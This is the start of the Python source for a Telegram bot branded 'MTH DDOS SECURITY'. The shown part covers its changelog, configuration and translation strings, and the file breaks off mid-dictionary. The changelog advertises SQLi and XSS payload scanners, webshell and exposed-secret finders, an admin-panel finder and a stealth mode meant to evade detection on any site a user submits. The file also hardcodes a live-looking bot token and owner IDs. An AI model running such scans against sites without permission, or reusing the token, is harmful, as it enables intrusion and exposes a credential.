#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  MTH DDOS SECURITY - TELEGRAM BOT v5.2                    ║
║  Advanced Security Testing Tools                          ║
║  Credits: @OnlyExaltarei, @Lhmodzz, @PETER_DNS          ║
╚══════════════════════════════════════════════════════════════╝

CHANGELOG v5.0:
- NEW: /ssl — Auditoria SSL/TLS completa (TLS version, cipher, HSTS, cert validity)
- NEW: /headers — Security Headers analysis with A-F grade
- NEW: /cors — CORS misconfiguration testing
- NEW: /robots — robots.txt analyzer with hidden directories
- NEW: /sitemap — sitemap.xml parser
- NEW: /tech — Advanced tech detection (Wappalyzer-like, 50+ technologies)
- NEW: /exposed — Sensitive file exposure scanner (.env, .git, .htpasswd, etc.)
- NEW: /backup — Exposed backup finder (.bak, .zip, .sql, .tar.gz)
- NEW: /api — API endpoint discovery (/api, /graphql, /swagger, etc.)
- NEW: /shell — Webshell hunter (c99, r57, indoxploit, etc.)
- NEW: /config — Configuration file exposure scanner
- NEW: /traceroute — Network traceroute
- NEW: /whois — Domain whois lookup (registrar, creation, expiry, DNSSEC)
- NEW: /ip — Advanced GeoIP (ASN, ISP, proxy/VPN detection, abuse history)
- NEW: /rate — Site security rating (0-100 score)
- NEW: /compare — Compare two sites security
- NEW: /history — Scan history for a domain
- NEW: /top — Top vulnerable sites scanned
- NEW: /pdf — Generate PDF scan report
- NEW: /schedule — Schedule a scan for later
- NEW: /maintenance — Owner maintenance mode
- NEW: /cooldown — Configure rate limit per user
- NEW: /vip — Add/remove VIP users (no rate limit)
- NEW: /log — Detailed command logs
- NEW: /clearlogs — Clear old logs
- NEW: /broadcast — Schedule broadcast for later
- IMPROVE: /sqli — Blind SQLi detection, boolean/time/UNION separated
- IMPROVE: /xss — DOM-based detection, polyglot payloads
- IMPROVE: /ports — Custom port list, better banner grabbing
- IMPROVE: /sub — 100+ subdomains + permutation scan
- IMPROVE: /dirs — 150+ directories + wordlist mode
- IMPROVE: /wp — Known vuln plugins/themes detection
- IMPROVE: /dns — DNSSEC check, DMARC/SPF analysis
- IMPROVE: Queue system for concurrent scans
- IMPROVE: Stealth mode for slower undetectable scans
- IMPROVE: Export scan results
- IMPROVE: Notify when site status changes
- PERF: Optimized database with new indexes
- PERF: VIP users bypass rate limit

CHANGELOG v4.1:
- NEW: /msg command — owners broadcast message to ALL users
- PERF: Cleanup USER_CMD_COUNT every 2 min (prevent memory leak)
- PERF: rate limit sleep between send_long_message chunks
- FIX: Laravel duplicate in CMS detector dict
- FIX: Django missing from url_sigs dict
- FIX: send_message_safe HTML entity decode order (and last)
- FIX: /start accepts @botname suffix without crash
- FIX: CMD_HANDLERS lambdas pass args to all handlers
- FIX: /bancodds dump escapes usernames with HTML chars
- FIX: /logs target escaped to prevent HTML injection
- IMPROVE: /help — reorganized, more detailed descriptions
- IMPROVE: /ping — shows total users count
- IMPROVE: /status — shows RAM, threads, DB size
- IMPROVE: /sqli — 30 payloads (added time-based attacks)
- IMPROVE: /xss — 18 payloads (added Angular/Vue/React)
- IMPROVE: /ports — 35 ports (added 3000,4000,5000,8000,8888,9090)
- IMPROVE: /admin — 85+ paths (added shell/cmd/config dirs)
- IMPROVE: /dirs — 45 directories (added .aws, .ssh, vendor)
- IMPROVE: /sub — 35 subdomains (added login,forum,git)
- IMPROVE: /wp — detect known vuln plugins
- IMPROVE: /dns — added SOA record query

CHANGELOG v4.3:
- FIX: /panel restored to Painel Admin Finder (encontrar painéis de sites)
- NEW: /botpanel — Painel admin do bot (donos)
- NEW: /panel agora é comando PÚBLICO para encontrar painéis admin
- FIX: process_update LAST_SEND_TIME_CLEANUP missing global declaration
- FIX: /ping latency calculation preserved (bot + API separate)
- IMPROVE: /panel — melhorado com 100+ paths, anti-wildcard, anti-SPA
- IMPROVE: set_commands.py atualizado com /botpanel e /panel
- IMPROVE: /cms — added Squarespace, Weebly detection
- IMPROVE: /panel — shows DB file size
- IMPROVE: /bancodds — better formatting
- NEW: /feedback — Enviar feedback/sugestões para o canal dos donos
- NEW: /report — Reportar bugs para o canal dos donos
- NEW: /stop — Parar scans ativos (donos)
- NEW: /rescan — Inline button para reescanear (sem precisar digitar novamente)
- IMPROVE: /sqli — verbose mode (/sqli url verbose) mostra cada payload testado
- IMPROVE: /xss — verbose mode (/xss url verbose) mostra cada payload testado
- IMPROVE: Resultados dos scanners agora incluem inline buttons (🔄 Rescan)
- IMPROVE: Cache de resultados salvo no banco (scan_cache table)
- NEW: DB tables: feedback, bug_reports, scan_cache, scan_tasks

CHANGELOG v3.6–v4.0 (resumo):
- FIX: SQLi/XSS scanners, DNS tools, FTP/SSH, send_document, polling offset, rate limit 429
- FIX: log_user UPSERT, extract_hostname on all handler progress messages
- FIX: CMS detector duplicates, Admin Finder dedup, DNS DoH headers
- PERF: Shared HTTP session, shared thread pool, DB indexes, single-query stats
- IMPROVE: Graceful shutdown, timeout/error handling, retry backoff, thread pool limit
- PERF: Port scanner timeout reduced to 1s (faster scans)
- PERF: Email scraper — stricter TLD validation (min 2 chars after dot)
- PERF: Reverse IP — added ip-api.com fallback when socket reverse fails
- PERF: Added /status command — quick health check
- PERF: Per-user rate limit — max 10 commands per minute per user
- PERF: scan_pool max_workers reduced from 22 to 15 (better for Termux)
- PERF: send_message_safe retry on parse error (1x retry)
- PERF: Added error logging with timestamp to all handlers
"""

import os
import sys
import time
import random
import threading
import requests
import subprocess
import socket
import concurrent.futures
import re
import json
import sqlite3
import logging
import hmac
import html as html_lib
import hashlib
import signal
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from bs4 import XMLParsedAsHTMLWarning
import warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
from colorama import Fore, Back, Style, init
import urllib3
import string as string_mod

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ═══════════════════════════════════════════════════════════════
#  PERFORMANCE: Shared HTTP session (connection pooling)
# ═══════════════════════════════════════════════════════════════
HTTP_SESSION = requests.Session()
HTTP_SESSION.verify = False
HTTP_SESSION.headers.update({'Connection': 'close'})
# Default timeout for all requests (can be overridden per-call)
_original_post = HTTP_SESSION.post
_original_get = HTTP_SESSION.get
HTTP_SESSION.post = lambda *a, timeout=10, **kw: _original_post(*a, timeout=timeout, **kw)
HTTP_SESSION.get = lambda *a, timeout=10, **kw: _original_get(*a, timeout=timeout, **kw)
_http_adapter = requests.adapters.HTTPAdapter(
    pool_connections=10, pool_maxsize=10,
    max_retries=requests.adapters.Retry(total=0)
)
HTTP_SESSION.mount('http://', _http_adapter)
HTTP_SESSION.mount('https://', _http_adapter)

# Shared thread pool — avoids creating ThreadPoolExecutor per handler
SCAN_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=15)

# DNS tools: check dig availability once at startup
_HAS_DIG = False
try:
    _HAS_DIG = subprocess.run(['which', 'dig'], capture_output=True, timeout=2).returncode == 0
except:
    pass

# ═══════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def random_string(length=12):
    """Generate a random alphanumeric string for baseline requests"""
    return ''.join(random.choices(string_mod.ascii_lowercase + string_mod.digits, k=length))

def extract_hostname(target):
    """Extract clean hostname/IP from a URL or raw domain/IP input.
    Handles: http://mthteam.com, https://mthteam.com:8080, mthteam.com, 8.8.8.8
    Returns the bare hostname or IP string."""
    if '://' in target:
        parsed = urlparse(target)
        hostname = parsed.hostname or parsed.netloc.split(':')[0].split('@')[-1]
        return hostname if hostname else target
    return target

# ═══════════════════════════════════════════════════════════════
#  TELEGRAM CONFIG
# ═══════════════════════════════════════════════════════════════
TELEGRAM_TOKEN = "8534082821:AAGJWMhlW27eU0kjB4QHul6knrX8pGRIUjw"
API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# DONOS DO BOT (IDs do Telegram)
OWNERS = {
    6822870889: "@OnlyExaltarei",
    5658716257: "@Lhmodzz",
    8716411086: "@PETER_DNS",
}

# Bot start time for uptime tracking
BOT_START_TIME = time.time()

# Graceful shutdown flag
SHUTDOWN_FLAG = False

# Rate limit tracking per chat_id
LAST_SEND_TIME = {}
SEND_COOLDOWN = 0.3  # seconds between messages to same chat
LAST_SEND_TIME_CLEANUP = 0  # Track when we last cleaned old entries
SEND_TIME_MAX_AGE = 300  # Clean entries older than 5 minutes

# Per-user command rate limit (max commands per minute)
USER_CMD_COUNT = {}  # user_id -> [timestamps]
USER_CMD_LIMIT = 10  # max 10 commands per minute per user
USER_CMD_WINDOW = 60  # 60 second window

# ═══════════════════════════════════════════════════════════════
#  NEW FEATURES: Cache, Ban, Error Log, Progress
# ═══════════════════════════════════════════════════════════════

# V4.3: Feedback channel (from user)
FEEDBACK_CHANNEL = "-1004392422665"

# V5.0: Maintenance mode
MAINTENANCE_MODE = False
MAINTENANCE_MSG = ""

# V5.0: VIP users (no rate limit, priority scans)
VIP_USERS = set()  # user_ids with VIP status

# V5.0: Custom rate limits per user
CUSTOM_RATE_LIMITS = {}  # user_id -> {limit: int, window: int}

# V5.0: Scheduled tasks
SCHEDULED_TASKS = {}  # task_id -> {time: float, chat_id: int, cmd: str, target: str, user_id: int}

# V5.0: Stealth mode tracking
STEALTH_MODE = False  # boolean: True when a stealth scan is active

# V5.0: Scan queue for managing concurrency
SCAN_QUEUE = []  # Queue of pending scans
SCAN_QUEUE_LOCK = threading.Lock()

# V5.0: Site status monitoring
SITE_STATUS_CACHE = {}  # (user_id, target) -> {last_status: bool, last_check: float}

# V4.3: Active scans tracking (for /stop)
ACTIVE_SCANS = {}  # scan_id -> threading.Event (set to stop)
STOP_EVENTS = {}   # user_id -> threading.Event

# V5.1: Username enrichment cache (user_id -> {username, first_name, last_name, fetched_at})
USER_NAME_CACHE = {}  # Cache to avoid repeated getChat API calls
USERNAME_CACHE_TTL = 3600  # 1 hour TTL for cached usernames

def enrich_username(user_id, username, first_name, last_name):
    """If username is empty, try to fetch it from Telegram API (with cache).
    Falls back to first_name if username is truly unavailable.
    Returns (username, first_name, last_name) — all guaranteed non-empty strings."""
    # Already have username — nothing to enrich
    if username:
        return username, first_name, last_name

    # Check cache first
    now = time.time()
    cached = USER_NAME_CACHE.get(user_id)
    if cached and (now - cached.get('fetched_at', 0)) < USERNAME_CACHE_TTL:
        return cached.get('username', ''), cached.get('first_name', first_name), cached.get('last_name', last_name)

    # Fetch from Telegram API
    try:
        resp = HTTP_SESSION.get(f"{API_URL}/getChat", json={"chat_id": user_id}, timeout=5)
        if resp and resp.status_code == 200:
            data = resp.json().get('result', {})
            fetched_username = data.get('username', '')
            fetched_first = data.get('first_name', first_name)
            fetched_last = data.get('last_name', last_name)
            # Cache the result
            USER_NAME_CACHE[user_id] = {
                'username': fetched_username,
                'first_name': fetched_first,
                'last_name': fetched_last,
                'fetched_at': now
            }
            return fetched_username, fetched_first, fetched_last
    except Exception:
        pass

    # Fallback: use first_name as display name
    display_name = first_name or 'User'
    return display_name, first_name, last_name

# V4.3: DB-backed cache TTL (seconds)
DB_CACHE_TTL = 600  # 10 minutes (V5.1: increased for better caching)

# Result cache: (command, target) -> (result_text, timestamp)
RESULT_CACHE = {}
CACHE_TTL = 300  # 5 minutes cache

# Banned users
BANNED_USERS = set()  # user_ids banned by /ban

# ═══════════════════════════════════════════════════════════════
#  i18n — MULTILINGUAL SUPPORT (PT / EN / ES)
# ═══════════════════════════════════════════════════════════════
# USER_LANG[user_id] = 'pt' | 'en' | 'es'
# Auto-detected from Telegram language_code; overridable via /lang
USER_LANG: dict = {}  # user_id -> language code

# ═══════════════════════════════════════════════════════════════
#  MENU SYSTEM — Target input state
# ═══════════════════════════════════════════════════════════════
# PENDING_TARGETS[user_id] = {'cmd': 'sqli', 'tier': 'normal', 'page': 'vulns'}
# When user clicks a scanner button, we store what they want to run
# Then when they send a URL, we execute it
PENDING_TARGETS: dict = {}  # user_id -> {cmd, tier}
MENU_MSG_IDS: dict = {}  # user_id -> message_id (for editing menu messages)

def get_user_lang(user_id: int) -> str:
    """Return the user's preferred language code ('pt', 'en', or 'es')."""
    return USER_LANG.get(user_id, 'pt')  # default to Portuguese

def set_user_lang(user_id: int, lang: str):
    """Persist a user's language preference in memory."""
    if lang in ('pt', 'en', 'es', 'vi', 'id'):
        USER_LANG[user_id] = lang

# Language map: Telegram language_code -> our code
_LANG_MAP = {
    'pt': 'pt', 'pt-br': 'pt', 'pt-pt': 'pt',
    'en': 'en',
    'es': 'es', 'es-419': 'es', 'es-ar': 'es', 'es-mx': 'es', 'es-es': 'es',
    'vi': 'vi', 'id': 'id',
    'fr': 'en', 'de': 'en', 'it': 'en', 'ru': 'en',  # fallback to EN
    'ja': 'en', 'zh': 'en', 'ko': 'en',  # fallback to EN
}

def detect_lang(message) -> str:
    """Extract Telegram language_code from a message and return our lang code."""
    try:
        code = message.get('from', {}).get('language_code', '')
        return _LANG_MAP.get(code, 'pt')
    except:
        return 'pt'

# ── Translation dictionary ──
# Keys are the Portuguese source string (lowered, trimmed).
# Values are dicts {en: ..., es: ...}.
_TRANSLATIONS: dict = {
    # Common errors
    'comando desconhecido.': {
        'en': 'unknown command.',
        'vi': 'lệnh không xác định.',
        'id': 'perintah tidak dikenal.',
        'es': 'comando desconocido.',
    },
    'use /help para ver os comandos disponíveis.': {
        'en': 'use /help to see available commands.',
        'vi': 'sử dụng /help để xem các lệnh có sẵn.',
        'id': 'gunakan /help untuk melihat perintah yang tersedia.',
        'es': 'use /help para ver los comandos disponibles.',
    },
    'não foi possível acessar o site': {
        'en': 'could not access the site',
        'vi': 'không thể truy cập trang web',
        'id': 'tidak dapat mengakses situs web',
        'es': 'no se pudo acceder al sitio',
    },
    '❌ id inválido. use o número do id do usuário.': {
        'en': '❌ Invalid ID. Use the numeric user ID.',
        'vi': '❌ ID không hợp lệ. Sử dụng số ID người dùng.',
        'id': '❌ ID tidak valid. Gunakan nomor ID pengguna.',
        'es': '❌ ID inválido. Use el número de ID del usuario.',
    },
    '❌ parâmetros inválidos. use números inteiros.': {
        'en': '❌ Invalid parameters. Use integers.',
        'vi': '❌ Tham số không hợp lệ. Sử dụng số nguyên.',
        'id': '❌ Parameter tidak valid. Gunakan bilangan bulat.',
        'es': '❌ Parámetros inválidos. Use números enteros.',
    },
    '❌ intervalo deve ser um número válido em minutos.': {
        'en': '❌ Interval must be a valid number of minutes.',
        'vi': '❌ Khoảng thời gian phải là số phút hợp lệ.',
        'id': '❌ Interval harus berupa menit yang valid.',
        'es': '❌ El intervalo debe ser un número válido de minutos.',
    },
    '❌ minutos devem ser um número válido.': {
        'en': '❌ Minutes must be a valid number.',
        'vi': '❌ Phút phải là một số hợp lệ.',
        'id': '❌ Menit harus berupa angka yang valid.',
        'es': '❌ Los minutos deben ser un número válido.',
    },
    '❌ tipo de mídia não suportado.': {
        'en': '❌ Unsupported media type.',
        'vi': '❌ Loại phương tiện không được hỗ trợ.',
        'id': '❌ Jenis media tidak didukung.',
        'es': '❌ Tipo de medio no soportado.',
    },
    '❌ traceroute não disponível neste servidor.': {
        'en': '❌ Traceroute not available on this server.',
        'vi': '❌ Traceroute không có sẵn trên máy chủ này.',
        'id': '❌ Traceroute tidak tersedia di server ini.',
        'es': '❌ Traceroute no disponible en este servidor.',
    },
    '❌ não foi possível obter informações do site.': {
        'en': '❌ Could not get site information.',
        'vi': '❌ Không thể lấy thông tin trang web.',
        'id': '❌ Tidak dapat mendapatkan informasi situs.',
        'es': '❌ No se pudo obtener información del sitio.',
    },
    '❌ servidor ocupado. tente novamente em alguns segundos.': {
        'en': '❌ Server busy. Try again in a few seconds.',
        'vi': '❌ Máy chủ bận. Vui lòng thử lại sau vài giây.',
        'id': '❌ Server sibuk. Coba lagi dalam beberapa detik.',
        'es': '❌ Servidor ocupado. Inténtelo de nuevo en unos segundos.',
    },
    '❌ acesso negado! este comando é restrito aos donos do bot.': {
        'en': '❌ Access denied! This command is restricted to bot owners.',
        'vi': '❌ Truy cập bị từ chối! Lệnh này chỉ dành cho chủ bot.',
        'id': '❌ Akses ditolak! Perintah ini khusus untuk pemilik bot.',
        'es': '❌ Acceso denegado! Este comando está restringido a los dueños del bot.',
    },
    '❌ erro ao buscar estatísticas.': {
        'en': '❌ Error fetching stats.',
        'vi': '❌ Lỗi khi lấy thống kê.',
        'id': '❌ Error saat mengambil statistik.',
        'es': '❌ Error al obtener estadísticas.',
    },
    '❌ erro ao buscar lista de usuários.': {
        'en': '❌ Error fetching user list.',
        'vi': '❌ Lỗi khi lấy danh sách người dùng.',
        'id': '❌ Error saat mengambil daftar pengguna.',
        'es': '❌ Error al obtener la lista de usuarios.',
    },
    '❌ erro ao exportar lista.': {
        'en': '❌ Error exporting list.',
        'vi': '❌ Lỗi khi xuất danh sách.',
        'id': '❌ Error saat mengekspor daftar.',
        'es': '❌ Error al exportar la lista.',
    },
    '❌ erro ao desbanir usuário.': {
        'en': '❌ Error unbanning user.',
        'vi': '❌ Lỗi khi bỏ cấm người dùng.',
        'id': '❌ Error saat membatalkan ban pengguna.',
        'es': '❌ Error al desbanear usuario.',
    },
    '❌ falha ao enviar o arquivo.': {
        'en': '❌ Failed to send file.',
        'vi': '❌ Không gửi được tệp.',
        'id': '❌ Gagal mengirim file.',
        'es': '❌ Fallo al enviar el archivo.',
    },
    '❌ falha ao enviar o relatório.': {
        'en': '❌ Failed to send report.',
        'vi': '❌ Không gửi được báo cáo.',
        'id': '❌ Gagal mengirim laporan.',
        'es': '❌ Fallo al enviar el informe.',
    },
    '❌ falha ao enviar relatório.': {
        'en': '❌ Failed to send report.',
        'vi': '❌ Không gửi được báo cáo.',
        'id': '❌ Gagal mengirim laporan.',
        'es': '❌ Fallo al enviar el informe.',
    },
    '❌ erro ao banir usuário.': {
        'en': '❌ Error banning user.',
        'vi': '❌ Lỗi khi cấm người dùng.',
        'id': '❌ Error saat membanned pengguna.',
        'es': '❌ Error al banear usuario.',
    },
    '❌ falha ao enviar o dump do banco.': {
        'en': '❌ Failed to send database dump.',
        'vi': '❌ Không gửi được dump cơ sở dữ liệu.',
        'id': '❌ Gagal mengirim dump database.',
        'es': '❌ Fallo al enviar el dump de la base de datos.',
    },
    # Progress / status messages
    'nenhum scan encontrado para este target.': {
        'en': 'No scan found for this target.',
        'vi': 'Không tìm thấy scan nào cho mục tiêu này.',
        'id': 'Tidak ada scan ditemukan untuk target ini.',
        'es': 'No se encontró ningún scan para este objetivo.',
    },
    'nenhum scan registrado ainda.': {
        'en': 'No scans registered yet.',
        'vi': 'Chưa có scan nào được ghi lại.',
        'id': 'Belum ada scan yang tercatat.',
        'es': 'Aún no hay scans registrados.',
    },
    'nenhum usuário encontrado.': {
        'en': 'No users found.',
        'vi': 'Không tìm thấy người dùng nào.',
        'id': 'Tidak ada pengguna ditemukan.',
        'es': 'No se encontraron usuarios.',
    },
    'nenhum usuário regular encontrado para enviar.': {
        'en': 'No regular users found to send to.',
        'vi': 'Không tìm thấy người dùng thường để gửi.',
        'id': 'Tidak ada pengguna reguler ditemukan untuk dikirim.',
        'es': 'No se encontraron usuarios regulares para enviar.',
    },
    'nenhum scan em andamento.': {
        'en': 'No scans in progress.',
        'vi': 'Không có scan nào đang chạy.',
        'id': 'Tidak ada scan yang sedang berjalan.',
        'es': 'No hay scans en progreso.',
    },
    'exportando lista de usuários...': {
        'en': 'Exporting user list...',
        'vi': 'Đang xuất danh sách người dùng...',
        'id': 'Mengekspor daftar pengguna...',
        'es': 'Exportando lista de usuarios...',
    },
    'gerando dump do banco de dados...': {
        'en': 'Generating database dump...',
        'vi': 'Đang tạo dump cơ sở dữ liệu...',
        'id': 'Membuat dump database...',
        'es': 'Generando dump de la base de datos...',
    },
    'traceroute expirou (timeout 30s).': {
        'en': 'Traceroute timed out (30s timeout).',
        'vi': 'Traceroute hết thời gian (timeout 30s).',
        'id': 'Traceroute habis waktu (timeout 30s).',
        'es': 'Traceroute agotó el tiempo de espera (30s).',
    },
    'nenhum scan ativo no momento.': {
        'en': 'No active scans at the moment.',
        'vi': 'Không có scan hoạt động lúc này.',
        'id': 'Tidak ada scan aktif saat ini.',
        'es': 'No hay scans activos en este momento.',
    },
    # Bot states
    'bot em manutenção. tente novamente em breve.': {
        'en': 'Bot is under maintenance. Please try again later.',
        'vi': 'Bot đang bảo trì. Vui lòng thử lại sau.',
        'id': 'Bot sedang dalam pemeliharaan. Silakan coba lagi nanti.',
        'es': 'Bot en mantenimiento. Inténtelo de nuevo más tarde.',
    },
    'você foi banido deste bot.': {
        'en': 'You have been banned from this bot.',
        'vi': 'Bạn đã bị cấm khỏi bot này.',
        'id': 'Anda telah dibanned dari bot ini.',
        'es': 'Has sido baneado de este bot.',
    },
    'rate limit excedido. tente novamente em 1 minuto.': {
        'en': 'Rate limit exceeded. Try again in 1 minute.',
        'vi': 'Đã vượt quá giới hạn tốc độ. Thử lại sau 1 phút.',
        'id': 'Batas kecepatan terlampaui. Coba lagi dalam 1 menit.',
        'es': 'Límite de velocidad excedido. Inténtelo de nuevo en 1 minuto.',
    },
    # Quick scan message
    'quick scan finalizado': {
        'en': 'Quick Scan completed!',
        'vi': 'Quick Scan hoàn tất!',
        'id': 'Quick Scan selesai!',
        'es': '¡Quick Scan completado!',
    },
    '❌ Falha ao enviar o arquivo.': {
        'en': '❌ Failed to send file.',
        'es': '❌ Fallo al enviar el archivo.',
    },
    '❌ Falha ao enviar o relatório.': {
        'en': '❌ Failed to send report.',
        'es': '❌ Fallo al enviar el informe.',
    },
    '❌ Falha ao enviar relatório.': {
        'en': '❌ Failed to send report.',
        'es': '❌ Fallo al enviar el informe.',
    },
    '❌ Erro ao banir usuário.': {
        'en': '❌ Error banning user.',
        'es': '❌ Error al banear usuario.',
    },
    '❌ Erro ao buscar estatísticas.': {
        'en': '❌ Error fetching stats.',
        'es': '❌ Error al obtener estadísticas.',
    },
    '❌ Erro ao buscar lista de usuários.': {
        'en': '❌ Error fetching user list.',
        'es': '❌ Error al obtener la lista de usuarios.',
    },
    '❌ Erro ao desbanir usuário.': {
        'en': '❌ Error unbanning user.',
        'es': '❌ Error al desbanear usuario.',
    },
    '❌ Erro ao exportar lista.': {
        'en': '❌ Error exporting list.',
        'es': '❌ Error al exportar la lista.',
    },
    '❌ <b>Falha ao enviar o dump do banco.</b> Tente novamente.': {
        'en': '❌ <b>Failed to send database dump.</b> Try again.',
        'es': '❌ <b>Fallo al enviar el dump de la base de datos.</b> Inténtelo de nuevo.',
    },
    'ℹ️ Nenhum scan em andamento.': {
        'en': 'ℹ️ No scans in progress.',
        'es': 'ℹ️ No hay scans en progreso.',
    },
    'ℹ️ Nenhum scan encontrado para este target.': {
        'en': 'ℹ️ No scan found for this target.',
        'es': 'ℹ️ No se encontró ningún scan para este objetivo.',
    },
    'ℹ️ Nenhum scan registrado ainda.': {
        'en': 'ℹ️ No scans registered yet.',
        'es': 'ℹ️ Aún no hay scans registrados.',
    },
    'ℹ️ Nenhum usuário encontrado.': {
        'en': 'ℹ️ No users found.',
        'es': 'ℹ️ No se encontraron usuarios.',
    },
    'ℹ️ Nenhum usuário regular encontrado para enviar.': {
        'en': 'ℹ️ No regular users found to send to.',
        'es': 'ℹ️ No se encontraron usuarios regulares para enviar.',
    },
    '⏱️ Traceroute expirou (timeout 30s).': {
        'en': '⏱️ Traceroute timed out (30s timeout).',
        'es': '⏱️ Traceroute agotó el tiempo de espera (30s).',
    },
    '⏳ <b>Exportando lista de usuários...</b>': {
        'en': '⏳ <b>Exporting user list...</b>',
        'es': '⏳ <b>Exportando lista de usuarios...</b>',
    },
    '⏳ <b>Gerando dump do banco de dados...</b>': {
        'en': '⏳ <b>Generating database dump...</b>',
        'es': '⏳ <b>Generando dump de la base de datos...</b>',
    },
    '📄 <b>Dump do banco enviado como arquivo.</b>': {
        'en': '📄 <b>Database dump sent as file.</b>',
        'es': '📄 <b>Dump de la base de datos enviado como archivo.</b>',
    },
    '❌ Use: /info &lt;url&gt;\\nExemplo: /info example.com': {
        'en': '❌ Use: /info &lt;url&gt;\\nExample: /info example.com',
        'es': '❌ Usa: /info &lt;url&gt;\\nEjemplo: /info example.com',
    },
    '❌ Use: /sqli &lt;url&gt; [verbose]\\nExemplo: /sqli example.com/?id=1\\nExemplo: /sqli example.com/?id=1 verbose': {
        'en': '❌ Use: /sqli &lt;url&gt; [verbose]\\nExample: /sqli example.com/?id=1\\nExample: /sqli example.com/?id=1 verbose',
        'es': '❌ Usa: /sqli &lt;url&gt; [verbose]\\nEjemplo: /sqli example.com/?id=1\\nEjemplo: /sqli example.com/?id=1 verbose',
    },
    '❌ Use: /xss &lt;url&gt; [verbose]\\nExemplo: /xss example.com/?q=\\nExemplo: /xss example.com/?q= verbose': {
        'en': '❌ Use: /xss &lt;url&gt; [verbose]\\nExample: /xss example.com/?q=\\nExample: /xss example.com/?q= verbose',
        'es': '❌ Usa: /xss &lt;url&gt; [verbose]\\nEjemplo: /xss example.com/?q=\\nEjemplo: /xss example.com/?q= verbose',
    },
    '❌ Use: /admin &lt;url&gt;\\nExemplo: /admin example.com': {
        'en': '❌ Use: /admin &lt;url&gt;\\nExample: /admin example.com',
        'es': '❌ Usa: /admin &lt;url&gt;\\nEjemplo: /admin example.com',
    },
    '❌ Use: /ports &lt;ip/domain&gt;\\nExemplo: /ports example.com': {
        'en': '❌ Use: /ports &lt;ip/domain&gt;\\nExample: /ports example.com',
        'es': '❌ Usa: /ports &lt;ip/domain&gt;\\nEjemplo: /ports example.com',
    },
    '❌ Use: /dirs &lt;url&gt;\\nExemplo: /dirs example.com': {
        'en': '❌ Use: /dirs &lt;url&gt;\\nExample: /dirs example.com',
        'es': '❌ Usa: /dirs &lt;url&gt;\\nEjemplo: /dirs example.com',
    },
    '❌ Use: /sub &lt;domain&gt;\\nExemplo: /sub example.com': {
        'en': '❌ Use: /sub &lt;domain&gt;\\nExample: /sub example.com',
        'es': '❌ Usa: /sub &lt;domain&gt;\\nEjemplo: /sub example.com',
    },
    '❌ Use: /wp &lt;url&gt;\\nExemplo: /wp example.com': {
        'en': '❌ Use: /wp &lt;url&gt;\\nExample: /wp example.com',
        'es': '❌ Usa: /wp &lt;url&gt;\\nEjemplo: /wp example.com',
    },
    '❌ Use: /emails &lt;url&gt;\\nExemplo: /emails example.com': {
        'en': '❌ Use: /emails &lt;url&gt;\\nExample: /emails example.com',
        'es': '❌ Usa: /emails &lt;url&gt;\\nEjemplo: /emails example.com',
    },
    '❌ Use: /dns &lt;domain&gt;\\nExemplo: /dns example.com': {
        'en': '❌ Use: /dns &lt;domain&gt;\\nExample: /dns example.com',
        'es': '❌ Usa: /dns &lt;domain&gt;\\nEjemplo: /dns example.com',
    },
    '❌ Use: /cms &lt;url&gt;\\nExemplo: /cms example.com': {
        'en': '❌ Use: /cms &lt;url&gt;\\nExample: /cms example.com',
        'es': '❌ Usa: /cms &lt;url&gt;\\nEjemplo: /cms example.com',
    },
    '❌ Use: /reverse &lt;ip&gt;\\nExemplo: /reverse 8.8.8.8': {
        'en': '❌ Use: /reverse &lt;ip&gt;\\nExample: /reverse 8.8.8.8',
        'es': '❌ Usa: /reverse &lt;ip&gt;\\nEjemplo: /reverse 8.8.8.8',
    },
    '❌ Use: /ftpssh &lt;ip/domain&gt;\\nExemplo: /ftpssh example.com': {
        'en': '❌ Use: /ftpssh &lt;ip/domain&gt;\\nExample: /ftpssh example.com',
        'es': '❌ Usa: /ftpssh &lt;ip/domain&gt;\\nEjemplo: /ftpssh example.com',
    },
    '❌ Use: /logs user:&lt;id&gt;\\nExemplo: /logs user:123456789': {
        'en': '❌ Use: /logs user:&lt;id&gt;\\nExample: /logs user:123456789',
        'es': '❌ Usa: /logs user:&lt;id&gt;\\nEjemplo: /logs user:123456789',
    },
    '❌ Use: /panel &lt;url&gt;\\nExemplo: /panel example.com': {
        'en': '❌ Use: /panel &lt;url&gt;\\nExample: /panel example.com',
        'es': '❌ Usa: /panel &lt;url&gt;\\nEjemplo: /panel example.com',
    },
    '❌ Use: /msg &lt;sua mensagem&gt;\\nOu envie um sticker/imagem e responda com /msg &lt;sua mensagem&gt;': {
        'en': '❌ Use: /msg &lt;sua mensagem&gt;\\nOu envie um sticker/imagem e responda com /msg &lt;sua mensagem&gt;',
        'es': '❌ Usa: /msg &lt;sua mensagem&gt;\\nOu envie um sticker/imagem e responda com /msg &lt;sua mensagem&gt;',
    },
    '❌ Use: /ban &lt;user_id&gt; [motivo]\\nExemplo: /ban 123456789 Spam de comandos': {
        'en': '❌ Use: /ban &lt;user_id&gt; [motivo]\\nExample: /ban 123456789 Spam de comandos',
        'es': '❌ Usa: /ban &lt;user_id&gt; [motivo]\\nEjemplo: /ban 123456789 Spam de comandos',
    },
    '❌ Use: /unban &lt;user_id&gt;\\nExemplo: /unban 123456789': {
        'en': '❌ Use: /unban &lt;user_id&gt;\\nExample: /unban 123456789',
        'es': '❌ Usa: /unban &lt;user_id&gt;\\nEjemplo: /unban 123456789',
    },
    '❌ Use: /feedback &lt;sua mensagem&gt;\\nExemplo: /feedback Bot está muito rápido!': {
        'en': '❌ Use: /feedback &lt;sua mensagem&gt;\\nExample: /feedback Bot está muito rápido!',
        'es': '❌ Usa: /feedback &lt;sua mensagem&gt;\\nEjemplo: /feedback Bot está muito rápido!',
    },
    '❌ Use: /bugreport &lt;descrição do bug&gt;\\nExemplo: /bugreport /sqli não funciona com https': {
        'en': '❌ Use: /bugreport &lt;descrição do bug&gt;\\nExample: /bugreport /sqli não funciona com https',
        'es': '❌ Usa: /bugreport &lt;descrição do bug&gt;\\nEjemplo: /bugreport /sqli não funciona com https',
    },
    '❌ Use: /rescan &lt;comando&gt; &lt;target&gt;\\nExemplo: /rescan sqli example.com': {
